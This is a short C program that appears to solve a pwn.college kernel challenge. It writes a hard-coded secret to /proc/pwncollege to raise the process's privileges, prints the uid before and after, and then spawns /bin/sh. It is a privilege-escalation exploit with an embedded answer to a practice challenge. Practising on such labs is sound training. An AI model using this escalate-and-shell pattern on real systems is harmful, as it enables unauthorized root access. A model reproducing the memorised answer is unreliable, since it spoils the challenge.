#include<stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include<assert.h>
int main(){

    int fd ;
    char ans[] = "baipxfdzjpolyxxk";
    char buffer[] = "0";
    fd = open("/proc/pwncollege",2);
    assert(fd >0);
    printf("BEFORE uid: %d\n",getuid());
    write(fd,ans,sizeof(ans));
    printf("AFTER uid: %d\n",getuid());
    //write(fd,ans,sizeof(ans));
    //read(fd,buffer,100);
    //printf("%s",buffer);

    execl("/bin/sh","/bin/sh",0);
    return 0 ;
}